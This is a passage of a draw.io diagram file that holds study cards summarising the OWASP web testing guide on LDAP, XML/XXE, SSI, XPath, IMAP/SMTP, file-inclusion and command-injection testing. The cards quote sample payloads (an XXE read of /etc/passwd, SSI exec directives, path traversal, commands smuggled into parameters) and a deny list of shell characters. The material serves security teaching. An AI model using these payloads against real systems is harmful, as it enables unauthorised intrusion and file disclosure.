href=&quot;https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access&quot;&gt;MS Access&lt;/a&gt;, &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection&quot;&gt;NoSQL&lt;/a&gt;, &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection&quot;&gt;ORM&lt;/a&gt;, &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side&quot;&gt;Client-side&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Tools: &lt;/span&gt;&lt;a href=&quot;https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap&quot; style=&quot;background-color: transparent;&quot;&gt;SQLMap&lt;/a&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;, &lt;a href=&quot;https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection&quot;&gt;FuzzDB&lt;/a&gt;, &lt;a href=&quot;http://packetstormsecurity.org/files/43795/sqlbftools-1.2.tar.gz.html&quot;&gt;sqlbftools&lt;/a&gt;,&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html&quot;&gt;OWASP SQL Injection Prevention CheatSheet&lt;/a&gt;, &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html&quot;&gt;OWASP&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html&quot;&gt;Database Security CheatSheet&lt;/a&gt;, &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html&quot;&gt;OWASP&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html&quot;&gt;Input Validation CheatSheet&lt;/a&gt;, &lt;a href=&quot;https://owasp.org/www-community/attacks/SQL_Injection&quot;&gt;OWASP SQL Injection Attack&lt;/a&gt;.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="2040" width="400" x="2440" y="2880" as="geometry" />
        </mxCell>
        <mxCell id="7NUe4-nLgCA8sBSW5HG5-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-06&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for LDAP Injection&lt;/h1&gt;&lt;p&gt;LDAP injection is a server-side attack, which could allow sensitive information about users and hosts represented in an LDAP structure to be disclosed, modified, or inserted.&lt;/p&gt;&lt;p&gt;An LDAP search filter is constructed in Polish notation, also known as Polish notation prefix notation.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;find(&quot;&lt;b&gt;cn=John &amp;amp; userPassword=mypass&lt;/b&gt;&quot;)&lt;/i&gt; -&amp;gt;&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;find(&quot;(&lt;b&gt;&amp;amp;(cn=John)(userPassword=mypass)&lt;/b&gt;)&quot;)&lt;/i&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify LDAP injection points.&lt;/li&gt;&lt;li&gt;Assess the severity of the injection.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;span&gt;Always true LDAP query:&amp;nbsp;&lt;/span&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;searchlogin= &quot;(&amp;amp;(uid=&lt;b&gt;*)(uid=*))(|(uid=*&lt;/b&gt;)(userPassword={MD5}&quot;+base64(pack(&quot;H*&quot;,md5(password)))+&quot;))&quot;;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools:&amp;nbsp;&lt;a href=&quot;https://www.ldapadministrator.com/&quot;&gt;Softerra LDAP Browser&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="360" width="400" x="2440" y="4920" as="geometry" />
        </mxCell>
        <mxCell id="7NUe4-nLgCA8sBSW5HG5-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-07&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for XML Injection&lt;/h1&gt;&lt;p&gt;XML Injection is&amp;nbsp;injecting an XML doc to the application with flaw in&amp;nbsp;contextually&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;data&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;validating proccess in&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;XML parser.&lt;/span&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify XML injection points.&lt;/li&gt;&lt;li&gt;Assess the types of exploits that can be attained and their severities.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;div&gt;&lt;hr id=&quot;null&quot;&gt;&lt;/div&gt;&lt;p&gt;Try to insert XML metacharacters: &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&#39;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&quot;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;gt;&lt;/i&gt;,&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;!--/--&amp;gt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;amp;&lt;/i&gt;,&amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;!\[CDATA\[ / ]]&amp;gt;&lt;/i&gt;.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;node attrib=&#39;foo&lt;b&gt;&#39;&lt;/b&gt;&#39;/&amp;gt;&lt;/i&gt; -&amp;gt; parser exception.&lt;br&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;node attrib=&quot;foo&lt;b&gt;&quot;&lt;/b&gt;&quot;/&amp;gt;&lt;/i&gt; -&amp;gt;&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;parser exception.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;username&amp;gt;foo&lt;b&gt;&amp;lt;&lt;/b&gt;&amp;lt;/username&amp;gt;&lt;/i&gt; -&amp;gt; node manipulation.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;username&amp;gt;foo&lt;b&gt;&amp;lt;!--&lt;/b&gt;&amp;lt;/username&amp;gt;&lt;/i&gt; -&amp;gt; comment node.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;tagnode&amp;gt;&lt;b&gt;&amp;amp;lt;&lt;/b&gt;&amp;lt;/tagnode&amp;gt;&lt;/i&gt; -&amp;gt; special character via Unicode mapping.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;username&amp;gt;&lt;b&gt;&amp;lt;![CDATA[&amp;lt;$userName]]&amp;gt;&lt;/b&gt;&amp;lt;/username&amp;gt;&lt;/i&gt; -&amp;gt; parsing escaping.&lt;br&gt;&lt;/p&gt;&lt;p&gt;XXE -&amp;nbsp;The set of valid entities can be extended by defining new entities.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &amp;gt;]&amp;gt;&lt;br&gt;&amp;lt;foo&amp;gt;&amp;amp;xxe;&amp;lt;/foo&amp;gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Tag injection&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;i style=&quot;&quot;&gt;Username: tony&lt;br&gt;&lt;/i&gt;&lt;i style=&quot;&quot;&gt;Password: Un6R34kb!e&lt;br&gt;&lt;/i&gt;&lt;i&gt;E-mail: test@test.com&lt;b style=&quot;&quot;&gt;&amp;lt;/mail&amp;gt;&amp;lt;userid&amp;gt;0&amp;lt;/userid&amp;gt;&amp;lt;mail&amp;gt;test@test.com&lt;/b&gt;&lt;/i&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Bypass DTD&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Username: tony&lt;br&gt;Password: Un6R34kb!e&lt;b&gt;&amp;lt;/password&amp;gt;&amp;lt;!--&lt;/b&gt;&lt;br&gt;E-mail: &lt;b&gt;--&amp;gt;&amp;lt;userid&amp;gt;0&amp;lt;/userid&amp;gt;&amp;lt;mail&amp;gt;test@test.com&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt&quot;&gt;wfuzz&lt;/a&gt;,&amp;nbsp;&lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html&quot;&gt;OWASP XXE Prevention Cheat Sheet&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="640" width="400" x="2440" y="5280" as="geometry" />
        </mxCell>
        <mxCell id="7NUe4-nLgCA8sBSW5HG5-3" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-08&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for SSI Injection&lt;/h1&gt;&lt;p&gt;Server-Side Includes(SSI) - directives that the web server parses before serving the page to the user.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify SSI injection points.&lt;/li&gt;&lt;li&gt;Assess the severity of the injection.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;To determine if SSI directives are supported, discover the type of web server that the target is running using information gathering techniques (see WSTG-INFO-02).&lt;/p&gt;&lt;p&gt;Look for pages with the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;.shtml&lt;/i&gt; extension, which is associated with SSI directives. But the use of the &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;.shtml&lt;/i&gt; extension is not mandatory, so not having found any &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;.shtml&lt;/i&gt; files doesn’t necessarily mean that the target is not vulnerable to SSI injection attacks.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;!--#&lt;b&gt;echo&lt;/b&gt; var=&quot;VAR&quot; --&amp;gt;&lt;br&gt;&amp;lt;!--#&lt;b&gt;include&lt;/b&gt; virtual=&quot;FILENAME&quot; --&amp;gt;&lt;br&gt;&amp;lt;!--#&lt;b&gt;exec&lt;/b&gt; cmd=&quot;OS_COMMAND&quot; --&amp;gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;GET / HTTP/1.1&lt;br&gt;Host: www.example.com&lt;br&gt;Referer: &lt;b&gt;&amp;lt;!--#exec cmd=&quot;/bin/ps ax&quot;--&amp;gt;&lt;/b&gt;&lt;br&gt;User-Agent: &lt;b&gt;&amp;lt;!--#include virtual=&quot;/proc/version&quot;--&amp;gt;&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://portswigger.net/burp/communitydownload&quot;&gt;Burp Suite&lt;/a&gt;, &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="480" width="400" x="2440" y="5920" as="geometry" />
        </mxCell>
        <mxCell id="7NUe4-nLgCA8sBSW5HG5-4" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-09&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for XPath Injection&lt;/h1&gt;&lt;p&gt;XPath is a language that has been designed and developed primarily to address parts of an XML document.&lt;/p&gt;&lt;p&gt;XPath injection allows&amp;nbsp;to execute user-controlled XPath queries.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Identify XPATH injection points.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;string(//user[username/text()=&#39;&lt;b&gt;&#39; or &#39;1&#39; = &#39;1&lt;/b&gt;&#39; and password/text()=&#39;&lt;b&gt;&#39; or &#39;1&#39; = &#39;1&lt;/b&gt;&#39;]/account/text())&lt;/i&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="260" width="400" x="2440" y="6400" as="geometry" />
        </mxCell>
        <mxCell id="7NUe4-nLgCA8sBSW5HG5-5" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-10&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for IMAP SMTP Injection&lt;/h1&gt;&lt;p&gt;Injection of arbitrary IMAP/SMTP commands into the mail servers.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify IMAP/SMTP injection points.&lt;/li&gt;&lt;li&gt;Understand the data flow and deployment structure of the system.&lt;/li&gt;&lt;li&gt;Assess the injection impacts.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;div&gt;&lt;hr id=&quot;null&quot;&gt;&lt;/div&gt;&lt;p&gt;Analyze the application’s ability in handling input -&amp;nbsp;send fake or malicious requests to the server and analyse the response.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://&amp;lt;webmail&amp;gt;/src/read_body.php&lt;b&gt;?mailbox=&lt;/b&gt;&amp;amp;passed_id=46106&amp;amp;startMessage=1&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://&amp;lt;webmail&amp;gt;/src/read_body.php?mailbox=&lt;b&gt;NOTEXIST&lt;/b&gt;&amp;amp;passed_id=46106&amp;amp;startMessage=1&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://&amp;lt;webmail&amp;gt;/src/read_body.php?mailbox=INBOX &lt;b&gt;PARAMETER2&lt;/b&gt;&amp;amp;passed_id=46106&amp;amp;startMessage=1&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://&amp;lt;webmail&amp;gt;/src/read_body.php?mailbox=INBOX&lt;b&gt;&quot;&lt;/b&gt;&amp;amp;passed_id=46106&amp;amp;startMessage=1&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://&amp;lt;webmail&amp;gt;/src/read_body.php?passed_id=46106&amp;amp;startMessage=1&lt;/i&gt;&lt;/p&gt;&lt;p&gt;If the app&amp;nbsp;returns a error code/message or&amp;nbsp;does not return an error code/message, but it does not realize the requested operation too (blind injection) - it represents successful IMAP/SMTP injection.&lt;/p&gt;&lt;p&gt;The error message (not controlled by the application) contains the name of the executed command, but reading the suitable &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection#references&quot;&gt;RFC&lt;/a&gt; allows the tester to understand what other possible commands can be used.&lt;/p&gt;&lt;p&gt;Typical structure of an IMAP/SMTP Injection:&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Header&lt;/b&gt;: ending of the expected command;&lt;/li&gt;&lt;li&gt;&lt;b&gt;Body&lt;/b&gt;: injection of the new command;&lt;/li&gt;&lt;li&gt;&lt;b&gt;Footer&lt;/b&gt;: beginning of the expected command.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;To execute an IMAP/SMTP command, the previous command must be terminated with the CRLF (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;%0d%0a&lt;/i&gt;) sequence.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://&amp;lt;webmail&amp;gt;/read_email.php?message_id=4791 &lt;b&gt;BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="720" width="400" x="2440" y="6660" as="geometry" />
        </mxCell>
        <mxCell id="M9q9ovhkxiswIcJwhkmQ-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-11&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Code Injection&lt;/h1&gt;&lt;p&gt;In Code Injection testing tester submits input that is processed by the web server as dynamic code or as an included file.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify injection points where you can inject code into the application.&lt;/li&gt;&lt;li&gt;Assess the injection severity.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;div&gt;&lt;hr id=&quot;null&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&lt;b&gt;&amp;amp;cmd=uname%20-a&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Look for scripts which take filenames as parameters.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Testing for Local File Inclusion&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://vulnerable_host/preview.php?file=&lt;b&gt;../../../../etc/passwd&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;Null Byte&amp;nbsp;is a control character with the value zero present in many character sets that is being used as a reserved character to mark the end of a string (any character after this special byte will be ignored).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;?php include($_GET[&#39;file&#39;].&quot;&lt;b&gt;.php&lt;/b&gt;&quot;); ?&amp;gt;&lt;br&gt;http://vulnerable_host/preview.php?file=../../../../etc/passwd&lt;b&gt;%00&lt;/b&gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Try to bypass extension control by spoofing the string size.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;LFI can be upgraded to RCE via built-in code-wrappers (PHP Filter, PHP ZIP, PHP Data,&amp;nbsp;PHP Expect, etc)&lt;/p&gt;&lt;p&gt;&lt;b style=&quot;background-color: transparent;&quot;&gt;Testing for Remote File Inclusion&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Remote File Inclusion (also known as RFI) is the process of including remote files through the exploiting of vulnerable inclusion procedures implemented in the application.&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://vuln_host/vuln_page.php&lt;b&gt;?file=http://fake_site/malicous_page&lt;/b&gt;&lt;/i&gt;&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing user-submitted input to any filesystem/framework API.&lt;/p&gt;&lt;p&gt;If this is not possible the application can maintain an allow list of files, that may be included by the page, and then use an identifier (for example the index number) to access to the selected file.&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html&quot;&gt;OWASP&amp;nbsp;File Upload Cheat Sheet&lt;/a&gt;, &lt;a href=&quot;https://github.com/P0cL4bs/Kadimus&quot;&gt;Kadimus&lt;/a&gt;, &lt;a href=&quot;https://github.com/D35m0nd142/LFISuite&quot;&gt;LFI Suite&lt;/a&gt;, &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="800" width="400" x="2440" y="7380" as="geometry" />
        </mxCell>
        <mxCell id="M9q9ovhkxiswIcJwhkmQ-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-INPV-12&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Command Injection&lt;/h1&gt;&lt;p&gt;OS command injection is a technique used via a web interface in order to execute OS commands on a web server.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Identify and assess the command injection points.&lt;/p&gt;&lt;div&gt;&lt;hr id=&quot;null&quot;&gt;&lt;/div&gt;&lt;p&gt;When viewing a file in a web application, the filename is often shown in the URL.&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://sensitive/cgi-bin/userData.pl?doc=&lt;b&gt;/bin/ls|&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;POST /public/doc HTTP/1.1&lt;br&gt;Host: www.example.com&lt;br&gt;[...]&lt;br&gt;Referer: http://127.0.0.1/WebGoat/attack?Screen=20&lt;br&gt;Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5&lt;br&gt;Authorization: Basic T2Vbc1Q9Z3V2Tc3e=&lt;br&gt;Content-Type: application/x-www-form-urlencoded&lt;br&gt;Content-length: 33&lt;br&gt;Doc=Doc1.pdf&lt;b&gt;+|+Dir c:\&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;The following special character can be used for command injection such as &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;|&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;amp;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;$&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;gt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&#39;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;!&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;Be aware of the uses of following API as it may introduce the command injection risks:&amp;nbsp;&lt;b&gt;Java&lt;/b&gt; (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Runtime.exec()&lt;/i&gt;),&amp;nbsp;&lt;b&gt;C/C++&lt;/b&gt; (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;system,&amp;nbsp;exec,&amp;nbsp;ShellExecute&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;),&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;b&gt;Python&lt;/b&gt; (&lt;/span&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;exec,&amp;nbsp;eval,&amp;nbsp;os.system,&amp;nbsp;os.popen,&amp;nbsp;subprocess.popen,&amp;nbsp;subprocess.call&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;The URL and form data needs to be sanitized for invalid characters.&lt;/p&gt;&lt;p&gt;An allow list containing only allowable characters or command list should be created to validate the user input.&lt;br&gt;&lt;/p&gt;&lt;p&gt;General deny list to be included for command injection: &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;|&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;amp;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;$&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;gt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&#39;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;\&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;!&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;gt;&amp;gt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;#&lt;/i&gt;.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Escape or filter special characters for windows:&amp;nbsp; &amp;nbsp;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;(&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;)&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;lt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;gt;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&amp;amp;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;*&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;‘&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;|&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;=&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;?&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;;&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;[&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;]&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;^&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;~&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;!&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 